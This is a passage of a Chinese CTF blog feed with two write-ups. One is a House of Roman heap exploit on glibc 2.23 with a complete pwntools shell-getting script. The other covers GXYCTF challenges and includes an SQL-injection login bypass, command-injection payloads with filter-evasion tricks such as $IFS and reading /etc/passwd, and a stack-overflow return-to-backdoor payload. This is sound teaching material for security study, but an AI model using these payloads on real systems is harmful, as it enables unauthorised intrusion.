class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># malloc_hook--&gt;[0x7ffff7dd1b10]</span></span><br><span class="line">malloc_hook_0x23 = <span class="string">"\xed\x1a"</span> <span class="comment">#__malloc_hook - 0x23 </span></span><br><span class="line">write(1,malloc_hook_0x23)</span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2020/03/20/86BQ4x.png" alt="86BQ4x.png"><br><br>从而 完成第一步。</p><h2 id="第二步-："><a href="#第二步-：" class="headerlink" title="第二步 ："></a>第二步 ：</h2><p>修复0x70 大小的 fastbin链，<br>当我们 可通过 3 次申请 0x70大小的chunk 申请到 含有 malloc_hook的 chunk，把它放入 heap_ptr[0]</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">malloc</span><span class="params">(<span class="number">0</span>x60,<span class="number">0</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">malloc</span><span class="params">(<span class="number">0</span>x60,<span class="number">0</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">malloc</span><span class="params">(<span class="number">0</span>x60,<span class="number">0</span>)</span></span> <span class="selector-id">#chunk_addr</span> is malloc_hook-<span class="number">0</span>x23</span><br></pre></td></tr></table></figure><p>申请后的，此时的fast bin链<br><img src="https://s1.ax1x.com/2020/03/20/86B1C6.png" alt="86B1C6.png"><br>我们用前面 创建好的 heapptr[15] 恢复 fast bin 链</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">free</span><span class="params">(<span class="number">15</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">write</span><span class="params">(<span class="number">15</span>,p64(<span class="number">0</span>)</span></span>)</span><br></pre></td></tr></table></figure><p>从而 完成第二步。<br><br><br><img src="https://s1.ax1x.com/2020/03/20/86B38K.png" alt="86B38K.png"><br><br><br>第三步：<br>通过unsortedbin attack，将main_arean地址写入malloc_hook<br>unsortedbin attack的具体实现方式  大家参考这篇博客，有图示，很容易理解。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="regexp">//</span>blog.csdn.net<span class="regexp">/qq_41453285/</span>article<span class="regexp">/details/</span><span class="number">99329694</span></span><br></pre></td></tr></table></figure><p>为了unsortedbin attack攻击顺利，我们首先更新下 heap_ptr[1], heap_ptr[2],heap_ptr[3] ,heap_ptr[4]  </p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">malloc</span><span class="params">(<span class="number">0</span>xc0,<span class="number">1</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">malloc</span><span class="params">(<span class="number">0</span>x18,<span class="number">2</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">malloc</span><span class="params">(<span class="number">0</span>xc0,<span class="number">3</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">malloc</span><span class="params">(<span class="number">0</span>xc0,<span class="number">4</span>)</span></span></span><br></pre></td></tr></table></figure><p>此时heap[0]对应的chunk 是含有 malloc_hook的chunk，我们可通过它 实现 我们的第四步攻击：通过低位地址写修改malloc_hook中的地址为one gadget，后面再说这个。<br><br><img src="https://s1.ax1x.com/2020/03/20/86B8gO.png" alt="86B8gO.png"><br><br>我们把heap[1]对应的chunk 给free 进 unsigned bin中，<br>首先free(1)<br>heap[1]对应的chunk 的fd (+0x10)和 bk(+0x18) 都指向 main_arena+88 ,<br><img src="https://s1.ax1x.com/2020/03/20/86BGvD.png" alt="86BGvD.png"><br>利用unsigned attack 攻击，我们通过覆盖 heap[1]对应的chunk  bk(+0x18) 的低字节，将其改为 malloc_hook 地址 -0x10 处。<br>然后再malloc 同样 size 的chunk 可使得 malloc_hook地址的内容为  （main_arena + 0x88） 0x7ffff7dd1b78</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">over = <span class="string">"B"</span>*<span class="number">8</span></span><br><span class="line">over += <span class="string">"\x00\x1b"</span></span><br><span class="line"><span class="function"><span class="title">write</span><span class="params">(<span class="number">1</span>,over)</span></span></span><br><span class="line"><span class="function"><span class="title">malloc</span><span class="params">(<span class="number">0</span>xc0,<span class="number">1</span>)</span></span></span><br></pre></td></tr></table></figure><p>完成 第三步。<br><br><img src="https://s1.ax1x.com/2020/03/20/86BYKe.png" alt="86BYKe.png"></p><h2 id="第四步："><a href="#第四步：" class="headerlink" title="第四步："></a>第四步：</h2><p>通过低位地址写修改malloc_hook中的地址为one gadget，后面再说这个。<br>我们看下libc 加载地址：<br><img src="https://s1.ax1x.com/2020/03/20/86BtDH.png" alt="86BtDH.png"><br>查看 one_gadget,这里我们使用 0xf02a4 那个。<br><img src="https://s1.ax1x.com/2020/03/20/86BNbd.png" alt="86BNbd.png"><br>他在内存中的地址应该为 hex(0x7ffff7a0d000+0xf02a4) 即 0x7ffff7afd2a4，它与 main_arena + 0x88） 0x7ffff7dd1b78 只有后6位 不同，<br>我们利用 修改 此时的heapptr[1]对应的chunk 将 malloc_hook中的地址中的内容的 后六位 给覆盖成  afd2a4 即可</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">over</span> = <span class="string">"A"</span>*<span class="number">0x13</span>   <span class="comment"># padding for malloc_hook</span></span><br><span class="line"><span class="keyword">over</span> += <span class="string">"\xa4\xd2\xaf"</span></span><br><span class="line"><span class="built_in">write</span>(<span class="number">0</span>,<span class="keyword">over</span>)</span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2020/03/20/86BaVA.png" alt="86BaVA.png"><br>可以看到 此时  malloc_hook中的地址中的内容 已经是 one_gadget 在内存中的地址了。<br>第五步<br>free 同一个 chunk 多次，造成 double free 异常，触发 malloc_printerr ，触发malloc,getshell。<br>我们连续free 掉前面 申请的heapptr[18] 对应的chunk。</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">free</span><span class="params">(<span class="number">18</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">free</span><span class="params">(<span class="number">18</span>)</span></span></span><br></pre></td></tr></table></figure><p>可以看到  拿到 shell。<br><img src="https://s1.ax1x.com/2020/03/20/86BdUI.png" alt="86BdUI.png"><br><br>当开启aslr后：<br>因为 循环执行以上exp，是有可能成功getshell的，就要看 运气了 。</p><figure class="highlight d"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">`seq 1 5000`</span>; <span class="keyword">do</span> python <span class="keyword">final</span>.py; done;</span><br></pre></td></tr></table></figure><p>我在我电脑上 是没有成功(应该是我没让它跑足够多的时间)，理论上是可以成功的，而且也有人成功。</p><h1 id="新解"><a href="#新解" class="headerlink" title="新解:"></a>新解:</h1><p>上面确实是一个好的 aslr的bypass 姿势，但基本上 如果程序中 可以 leak的话， 一般是直接打IO_file leak libc 了，然后哦就是常规 做法了，成功率 1/16.<br>如果 又不熟悉的  大家 可以 网上 搜索下  “IO_FILE泄露 libc” 学习下，这里就不多 阐述了。</p><h2 id="新解思路："><a href="#新解思路：" class="headerlink" title="新解思路："></a>新解思路：</h2><p>通过引起堆块重叠 然后修改下一个chunk的末尾两个字节 然后将块申请到stdout上 然后泄漏io_stdin的地址 再用堆块重叠写mallochook为onegadget<br>最后同样 free 同一个 chunk 多次，造成 double free 异常，触发 malloc_printerr ，触发malloc,getshell。</p><hr><p>就放一个 该题的一个 exp（请教的 fmyy师傅），// 注意，可以当模板哦！吹爆 fmyy 师傅 ，哈哈。</p><h2 id="exp："><a href="#exp：" class="headerlink" title="exp："></a>exp：</h2><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn import*</span><br><span class="line">def <span class="builtin-name">add</span>(size,idx):</span><br><span class="line">#p.sendline(<span class="string">"1"</span>)</span><br><span class="line">#p.sendline(str(size))</span><br><span class="line">#p.sendline(str(idx))</span><br><span class="line">p.sendlineafter(<span class="string">'Free'</span>,<span class="string">"1"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'Enter size of chunk :'</span>,str(size))</span><br><span class="line">p.sendlineafter(<span class="string">'Enter index :'</span>,str(idx))</span><br><span class="line"></span><br><span class="line">def free(idx):</span><br><span class="line">p.sendlineafter(<span class="string">'Free'</span>,<span class="string">"3"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'Enter index :'</span>,str(idx))</span><br><span class="line"></span><br><span class="line">def <span class="builtin-name">edit</span>(idx,data):</span><br><span class="line">#p.recvuntil(<span class="string">'Free'</span>)</span><br><span class="line">#p.sendline(<span class="string">'2'</span>)</span><br><span class="line">#p.recvuntil(<span class="string">'Enter index of chunk :'</span>)</span><br><span class="line">#p.sendline(str(idx))</span><br><span class="line">#p.recvuntil(<span class="string">'Enter data :'</span>)</span><br><span class="line">#p.send(data)</span><br><span class="line">p.sendlineafter(<span class="string">'Free'</span>,<span class="string">"2"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'Enter index of chunk :'</span>,str(idx))</span><br><span class="line">p.sendafter(<span class="string">'Enter data :'</span>,data)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./new_chall'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc-2.23.so'</span>,<span class="attribute">checksec</span>=<span class="literal">False</span>)</span><br><span class="line">context.log_level =<span class="string">'DEBUG'</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">'Enter name :'</span>,<span class="string">'FMYY'</span>)</span><br><span class="line"><span class="builtin-name">add</span>(0x18,0)</span><br><span class="line"><span class="builtin-name">add</span>(0xC8,1)</span><br><span class="line"><span class="builtin-name">add</span>(0x68,2)</span><br><span class="line"><span class="builtin-name">edit</span>(1,<span class="string">'\x00'</span><span class="number">*0</span>x68 + p64(0x61))</span><br><span class="line">free(1)</span><br><span class="line"><span class="builtin-name">add</span>(0xC8,1)</span><br><span class="line"><span class="builtin-name">add</span>(0x68,3)</span><br><span class="line"><span class="builtin-name">add</span>(0x68,4)</span><br><span class="line"><span class="builtin-name">add</span>(0x68,5)</span><br><span class="line"><span class="builtin-name">edit</span>(0,<span class="string">'\x00'</span><span class="number">*0</span>x18 + <span class="string">'\x71'</span>)</span><br><span class="line">free(2)</span><br><span class="line">free(3)</span><br><span class="line"><span class="builtin-name">edit</span>(3,<span class="string">'\x20'</span>)</span><br><span class="line"><span class="builtin-name">edit</span>(1,<span class="string">'\xDD\x25'</span>)</span><br><span class="line"><span class="builtin-name">add</span>(0x68,9)</span><br><span class="line"><span class="builtin-name">add</span>(0x68,9)</span><br><span class="line">payload = <span class="string">'\x00'</span><span class="number">*0</span>x33 + p64(0xFBAD1800) + p64(0)<span class="number">*3</span> + <span class="string">'\x88'</span></span><br><span class="line"><span class="builtin-name">add</span>(0x68,9)</span><br><span class="line"><span class="builtin-name">edit</span>(9,payload)</span><br><span class="line"><span class="comment">#修改stdout的flag位为0xfbad1800</span></span><br><span class="line"><span class="comment">#bing将_IO_write_base的最后一个字节改小，从而实现多输出一些内容，这些内容里面就包含了libc地址。</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">'\x7f'</span>).ljust(8,<span class="string">'\x00'</span>)) - libc.symbols[<span class="string">'_IO_2_1_stdin_'</span>]</span><br><span class="line">libc.address = libc_base</span><br><span class="line"></span><br><span class="line">free(4)</span><br><span class="line"><span class="builtin-name">edit</span>(4,p64(0))</span><br><span class="line"><span class="builtin-name">add</span>(0x68,0)</span><br><span class="line">free(0)</span><br><span class="line"><span class="builtin-name">edit</span>(0,p64(libc.symbols[<span class="string">'__malloc_hook'</span>] - 0x23))</span><br><span class="line"><span class="builtin-name">add</span>(0x68,0)</span><br><span class="line"><span class="builtin-name">add</span>(0x68,0)</span><br><span class="line">p.sendlineafter(<span class="string">'Free'</span>,<span class="string">'2'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'Enter index of chunk :'</span>,<span class="string">'0'</span>)</span><br><span class="line">p.send(<span class="string">'\x00'</span><span class="number">*0</span>x13+p64(libc_base+0xF02A4))</span><br><span class="line"><span class="comment">#向malloc_hook 地址里写入 onegadget </span></span><br><span class="line"></span><br><span class="line"><span class="comment">#free 同一个 chunk 多次，造成 double free 异常，触发 malloc_printerr ，触发malloc,getshell。</span></span><br><span class="line">free(1)</span><br><span class="line">free(1)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h1><p>在程序中 没有leak(fclose(stdout))的时候，我们就只能选择House_of_Roman （全程爆破）去pwn，如果 可以leak，我们就可以 直接 打 IO_file 去泄露libc，然后常规 pwn 就可以了。</p><h2 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h2><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">https:</span>//wiki.x10sec<span class="meta">.org</span>/pwn/io_file/introduction/<span class="meta">#printfputs</span></span><br><span class="line"><span class="symbol">https:</span>//n0va-scy.github.io/<span class="number">2019</span>/<span class="number">09</span>/<span class="number">21</span>/IO_FILE/</span><br><span class="line"><span class="symbol">https:</span>//xz.aliyun.com/t/<span class="number">2316</span><span class="meta">#toc-3</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;停更了快小半年了，罪过呐，重新捡起。最近要努力学堆！！！文章首发于 先知社区。&lt;/p&gt;
    
    </summary>
    
    
      <category term="House系列" scheme="http://yoursite.com/tags/House%E7%B3%BB%E5%88%97/"/>
    
  </entry>
  
  <entry>
    <title>GXYCTF_wp0</title>
    <link href="http://yoursite.com/2019/12/22/GXYCTF_wp0/"/>
    <id>http://yoursite.com/2019/12/22/GXYCTF_wp0/</id>
    <published>2019-12-21T16:06:07.000Z</published>
    <updated>2019-12-21T18:45:57.798Z</updated>
    
    <content type="html"><![CDATA[<p>2019GXYCTF于昨天晚上结束,做得很是糟糕！一段时间 不做题，pwn快忘完了！难受，不过还是先准备期末考试吧！</p><a id="more"></a><h3 id="0x00：GXYCTF部分详细题解"><a href="#0x00：GXYCTF部分详细题解" class="headerlink" title="0x00：GXYCTF部分详细题解"></a>0x00：GXYCTF部分详细题解</h3><blockquote><p>2019GXYCTF于昨天晚上结束，这里我写下较详细的部分题解，希望可以帮到大家！</p></blockquote><h3 id="0x01：baby-sqli"><a href="#0x01：baby-sqli" class="headerlink" title="0x01：baby_sqli"></a>0x01：baby_sqli</h3><blockquote><p>进来后是一个  登录页面<br><img src="https://s2.ax1x.com/2019/12/22/QxKosU.png" alt="QxKosU.png"></p></blockquote><p>首先 尝试下</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin</span><br><span class="line"><span class="number">123</span></span><br></pre></td></tr></table></figure><p>登录，然后查看 源代码，发现一串很可疑的字符串<br><img src="https://s2.ax1x.com/2019/12/22/QxKTLF.png" alt="QxKTLF.png"></p><p>尝试了下，发现是base32编码</p><blockquote><p>MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5</p></blockquote><p>对其进行解码得到：</p><blockquote><p>c2VsZWN0ICogZnJvbSB1c2VyIHdoZXJlIHVzZXJuYW1lID0gJyRuYW1lJw==</p></blockquote><p>然后base64 解码得到：</p><blockquote><p>select * from user where username = ‘$name’</p></blockquote><p>应该是 提示我们 要从 username 入手</p><p>我们查看下  他有几个字段</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin<span class="string">' union select 1,2,3#</span></span><br><span class="line"><span class="string">admin'</span> <span class="class"><span class="keyword">union</span> <span class="title">select</span> 1,2,3,4<span class="comment">#</span></span></span><br></pre></td></tr></table></figure><p>可以得到 是3个字段<br><br>我们猜测字段名是  </p><blockquote><p>ip username password</p></blockquote><p>然后我们通过下面语句</p><blockquote><p>admin’ union select 1,’admin’,3#</p></blockquote><p>//即把admin 放到第二个位置 不报错<br><br>得到第二个字段就是我们的username字段<br><br>然后 题目提示了”md5”,于是我们便可以去猜测 它的后端是怎么写的:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$row;</span></span><br><span class="line"><span class="php">$pass=$_POST[<span class="string">'pw'</span>];</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>($row[<span class="string">'username'</span>]==<span class="string">'admin'</span>)&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">if</span>($row[<span class="string">'password'</span>]==md5($pass))&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> $flag;</span></span><br><span class="line"><span class="php">    &#125;<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="string">"wrong pass!"</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"wrong user!"</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure><p>就是 我们的sql语句执行时，</p><p>passsword字段中的内容要==md5(我们密码栏输入的password)</p><p>然后我们便随便找个 密码 就123吧：</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">明文：<span class="number">123</span></span><br><span class="line">md5 : 202<span class="type">cb962ac59075b964b07152d234b70</span></span><br></pre></td></tr></table></figure><p>于是我们便构造这样的payload：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username栏：' union <span class="keyword">select</span> <span class="number">1</span>,<span class="string">'admin'</span>,<span class="string">'202cb962ac59075b964b07152d234b70'</span><span class="comment">#</span></span><br><span class="line"><span class="keyword">password</span>栏：<span class="number">123</span></span><br></pre></td></tr></table></figure><p>登录便可以得到</p><blockquote><p> flag：GXY{y0u_4re_not_aDmin!}</p></blockquote><p><img src="https://s2.ax1x.com/2019/12/22/QxK4zV.png" alt="QxK4zV.png"><br><br></p><h3 id="0x02：ping-ping-ping"><a href="#0x02：ping-ping-ping" class="headerlink" title="0x02：ping ping ping"></a>0x02：ping ping ping</h3><p>我们进来后可以看到：<br><br><img src="https://s2.ax1x.com/2019/12/22/QxKIMT.png" alt="QxKIMT.png"></p><p>这题应该时  考查 任意命令执行的<br><br>我们首先 ping 本地<br><br>填入 <br></p><blockquote><p>127.0.0.1;ls </p></blockquote><p>点击确定 得到)<br><br><img src="https://s2.ax1x.com/2019/12/22/QxKHZ4.png" alt="QxKHZ4.png"><br><br>然后，既然flag.php在同级目录下，直接 cat 拿到就好了<br><br>如果它没有过滤的话我们应该这样填入 <br></p><blockquote><p>127.0.0.1;cat flag.php</p></blockquote><p>但经过我们的输入发现，这题它把 空格和 ‘flag’ 给过滤了，<br><br>所以，我们得想办法把 空格和 ‘flag’ 给绕过</p><p>我们先来 绕过下空格，<br><br>在这之前我们来了解下 </p><h3 id="0x03：linux-常见空格绕过方法"><a href="#0x03：linux-常见空格绕过方法" class="headerlink" title="0x03：linux 常见空格绕过方法"></a>0x03：linux 常见空格绕过方法</h3><ul><li><p>使用&lt;或者&lt;&gt;来绕过空格</p><blockquote><p>cat&lt;flag.txt</p></blockquote></li><li><p>花括号 扩展{OS_COMMAND,ARGUMENT}</p><blockquote><p>{cat,/etc/passwd}</p></blockquote></li><li><p>$IFS绕过</p><blockquote><p>cat$IFSflag.txt</p></blockquote></li><li><p>变量控制</p><blockquote><p>x=$’cat\x09./a.txt’&amp;&amp;$x</p></blockquote></li></ul><p>经过 我们测试 这题我们可以通过 $IFS 绕过 空格</p><p>然后我们来 绕过  ‘flag’过滤</p><p>这里我们 选择构造变量然后使用变量去绕过：<br>于是最后我们构造 payload为：</p><blockquote><p>127.0.0.1;a=f;d=ag;c=l;cat$IFS$a$c$d.php</p></blockquote><p>然后BurpSuite抓包便成功拿到flag.php中得内容</p><blockquote><p>flag：GXY(1_sh0uld_ban_Icmp_4tFirst)<br><img src="https://s2.ax1x.com/2019/12/22/QxKbdJ.png" alt="QxKbdJ.png"></p></blockquote><blockquote><p>这次很难受，就做出来一道pwn!我还是写详细些吧！</p></blockquote><h3 id="0x04：fantasy"><a href="#0x04：fantasy" class="headerlink" title="0x04：fantasy"></a>0x04：fantasy</h3><blockquote><p>首先查看程序属性及保护：</p></blockquote><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">$</span> <span class="string">file</span> <span class="string">fantasy</span></span><br><span class="line"><span class="attr">fantasy:</span> <span class="string">ELF</span> <span class="number">64</span><span class="string">-bit</span> <span class="string">LSB</span> <span class="string">executable,</span> <span class="string">x86-64,</span> <span class="string">version</span> <span class="number">1</span> <span class="string">(SYSV),</span> <span class="string">dynamically</span> <span class="string">linked,</span> <span class="string">interpreter</span> <span class="string">/lib64/l,</span> </span><br><span class="line"><span class="string">for</span> <span class="string">GNU/Linux</span> <span class="number">2.6</span><span class="number">.32</span><span class="string">,</span> <span class="string">BuildID[sha1]=0964804519339e930431d2c6f850fd89c3e79f29,</span> <span class="string">not</span> <span class="string">stripped</span></span><br><span class="line"><span class="string">---------------------------------------------------------------------------------</span></span><br><span class="line"><span class="string">$</span> <span class="string">checksec</span> <span class="string">fantasy</span></span><br><span class="line">    <span class="attr">Arch:</span>     <span class="string">amd64-64-little</span></span><br><span class="line">    <span class="attr">RELRO:</span>    <span class="string">Partial</span> <span class="string">RELRO</span></span><br><span class="line">    <span class="attr">Stack:</span>    <span class="literal">No</span> <span class="string">canary</span> <span class="string">found</span></span><br><span class="line">    <span class="attr">NX:</span>       <span class="string">NX</span> <span class="string">enabled</span></span><br><span class="line">    <span class="attr">PIE:</span>      <span class="literal">No</span> <span class="string">PIE</span> <span class="string">(0x400000)</span></span><br></pre></td></tr></table></figure><blockquote><p>我们可以看出该程序是 动态链接的64位elf文件，另外仅开启NX保护！<br><br>然后我们将它拖入ida中（64位）：</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  welcome(*(_QWORD *)&amp;argc, argv, envp);</span><br><span class="line">  vul();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"OK,see you again"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们进去vul()函数中：</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vul</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+0h] [rbp-30h]//这里我们可以看出buf距离rbp的地址是0x30， 即48</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"I got a message bank ,you can store something in it!"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"input your message"</span>);</span><br><span class="line">  <span class="built_in">read</span>(<span class="number">0</span>, &amp;buf, <span class="number">0x40</span>uLL); <span class="comment">//这里有个很明显得栈溢出漏洞</span></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"OK , i got it ,let me see if i can bring you fantasy!!!"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>另外，我们可以在ida函数栏可以看到fantasy函数，发现是后门函数</p><figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> fantasy()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="function"><span class="keyword">return</span> <span class="title">system</span><span class="params">(<span class="string">"/bin/sh"</span>)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>于是我们先把它地址先记下来：0x400735<br><img src="https://s2.ax1x.com/2019/12/22/QxMeQf.png" alt="QxMeQf.png"></p><h3 id="解题思路："><a href="#解题思路：" class="headerlink" title="解题思路："></a>解题思路：</h3><blockquote><p>我们可通过栈溢出漏洞去覆盖掉ret_addr为 fantasy函数的地址即可拿到pwn掉程序！<br><br>于是构造payload：<br>payload=’a’*48+p64(0xdeadbeef)+p64(0x400735)</p></blockquote><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">原栈结构大概是这样（如下）：</span><br><span class="line"><span class="number">0000</span>| buf</span><br><span class="line"><span class="number">0008</span>|</span><br><span class="line"><span class="number">0016</span>|</span><br><span class="line"><span class="number">0024</span>| </span><br><span class="line"><span class="number">0032</span>| </span><br><span class="line"><span class="number">0040</span>| </span><br><span class="line"><span class="number">0048</span>| </span><br><span class="line"><span class="number">0056</span>| rbp</span><br><span class="line"><span class="number">0064</span>| ret_addr</span><br><span class="line">————————————————————————————————————————————</span><br><span class="line">我们构造后，栈结构就变成这样下面这样了，</span><br><span class="line">执行到返回地址时，程序就会返回到我们构造的fantasy后门函数去继续执行！</span><br><span class="line">——————————————————————————————————————————————</span><br><span class="line"><span class="number">0000</span>| a*<span class="number">48</span></span><br><span class="line"><span class="number">0008</span>|</span><br><span class="line"><span class="number">0016</span>|</span><br><span class="line"><span class="number">0024</span>| </span><br><span class="line"><span class="number">0032</span>| </span><br><span class="line"><span class="number">0040</span>| </span><br><span class="line"><span 